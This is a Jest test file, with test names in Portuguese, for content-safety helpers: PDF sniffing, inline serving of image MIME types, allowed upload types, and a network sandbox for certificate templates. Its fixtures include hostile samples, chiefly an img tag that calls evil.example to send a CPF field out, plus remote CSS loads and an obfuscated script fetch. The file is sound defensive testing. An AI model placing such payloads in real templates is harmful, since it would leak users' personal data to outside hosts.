/// <reference types="jest" />
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { ALLOWED_UPLOAD_CONTENT_TYPES, findTemplateNetworkViolation, looksLikePdf, resolveImageResponse } from './content-safety'

describe('looksLikePdf', () => {
  it('buffer com assinatura %PDF- no início → true', () => {
    expect(looksLikePdf(Buffer.from('%PDF-1.7\n%âãÏÓ'))).toBe(true)
  })

  it('HTML disfarçado de PDF → false', () => {
    expect(looksLikePdf(Buffer.from('<html><script>alert(1)</script></html>'))).toBe(false)
  })

  it('buffer vazio → false', () => {
    expect(looksLikePdf(Buffer.from(''))).toBe(false)
  })
})

describe('resolveImageResponse', () => {
  it('tipo de imagem raster seguro → serve inline com o próprio tipo', () => {
    expect(resolveImageResponse('image/png')).toEqual({ contentType: 'image/png', inline: true })
    expect(resolveImageResponse('image/jpeg')).toEqual({ contentType: 'image/jpeg', inline: true })
  })

  it('normaliza caixa e parâmetros do MIME', () => {
    expect(resolveImageResponse('IMAGE/WEBP; charset=binary')).toEqual({ contentType: 'image/webp', inline: true })
  })

  it('SVG → NÃO inline (SVG executa script) → octet-stream para download', () => {
    expect(resolveImageResponse('image/svg+xml')).toEqual({ contentType: 'application/octet-stream', inline: false })
  })

  it('text/html → NÃO inline → octet-stream para download', () => {
    expect(resolveImageResponse('text/html')).toEqual({ contentType: 'application/octet-stream', inline: false })
  })

  it('tipo ausente → octet-stream para download', () => {
    expect(resolveImageResponse(undefined)).toEqual({ contentType: 'application/octet-stream', inline: false })
  })
})

describe('ALLOWED_UPLOAD_CONTENT_TYPES', () => {
  it('inclui os tipos legítimos de upload', () => {
    expect(ALLOWED_UPLOAD_CONTENT_TYPES).toEqual(expect.arrayContaining(['application/pdf', 'image/png', 'video/mp4']))
  })

  it('NÃO inclui tipos de conteúdo ativo (HTML/SVG/XHTML)', () => {
    expect(ALLOWED_UPLOAD_CONTENT_TYPES).not.toContain('text/html')
    expect(ALLOWED_UPLOAD_CONTENT_TYPES).not.toContain('image/svg+xml')
    expect(ALLOWED_UPLOAD_CONTENT_TYPES).not.toContain('application/xhtml+xml')
  })
})

describe('findTemplateNetworkViolation (ID-10: sandbox de rede do certificado)', () => {
  it('template limpo com data: URIs → null', () => {
    const html = '<html><style>.a{background:url(data:image/png;base64,AAA)}</style><img src="data:image/png;base64,AAA" /><p>{{ studentName }}</p></html>'
    expect(findTemplateNetworkViolation(html)).toBeNull()
  })

  it('o template de fábrica do certificado passa no sandbox', () => {
    const factory = readFileSync(join(__dirname, '..', '..', 'modules', 'certificate', 'assets', 'certificate.html'), 'utf8')
    expect(findTemplateNetworkViolation(factory)).toBeNull()
  })

  it('img com https → violação (exfiltração de PII via subrecurso)', () => {
    expect(findTemplateNetworkViolation('<img src="https://evil.example/pix?d={{ cpf }}">')).toContain('http(s)')
  })

  it('http em url() do CSS → violação', () => {
    expect(findTemplateNetworkViolation('<style>.bg{background:url(http://evil.example/a.png)}</style>')).toContain('http(s)')
  })

  it('URL relativa a protocolo (//host) em atributo → violação', () => {
    expect(findTemplateNetworkViolation('<img src="//evil.example/a.png">')).toContain('protocolo')
  })

  it('url(//host) no CSS → violação', () => {
    expect(findTemplateNetworkViolation('<style>.a{background:url(//evil.example/x)}</style>')).toContain('url(//host)')
  })

  it('<script> → violação (fetch pode montar URL fora do padrão)', () => {
    expect(findTemplateNetworkViolation('<script>fetch("ht"+"tps://x")</script>')).toContain('<script>')
  })

  it('tags de carregamento externo (iframe/link/base/form) → violação', () => {
    expect(findTemplateNetworkViolation('<iframe srcdoc="x"></iframe>')).not.toBeNull()
    expect(findTemplateNetworkViolation('<link rel="stylesheet" href="x.css">')).not.toBeNull()
    expect(findTemplateNetworkViolation('<base href="/x/">')).not.toBeNull()
  })

  it('<meta http-equiv="refresh"> → violação', () => {
    expect(findTemplateNetworkViolation('<meta http-equiv="refresh" content="0;url=x">')).not.toBeNull()
  })

  it('@import no CSS → violação', () => {
    expect(findTemplateNetworkViolation('<style>@import "x.css";</style>')).toContain('@import')
  })
})
